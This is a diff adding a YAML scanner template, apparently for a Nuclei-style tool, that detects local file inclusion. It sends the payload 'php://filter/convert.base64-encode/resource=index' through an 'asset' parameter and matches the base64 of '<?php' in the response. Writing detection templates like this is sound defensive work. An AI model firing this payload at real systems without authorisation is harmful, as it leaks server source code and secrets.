@@ -1,0 +1,20 @@
+id: lfi6-0335
+name: 'Traversal in asset'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via asset'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      asset:
+        - 'php://filter/convert.base64-encode/resource=index'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'PD9waHA'
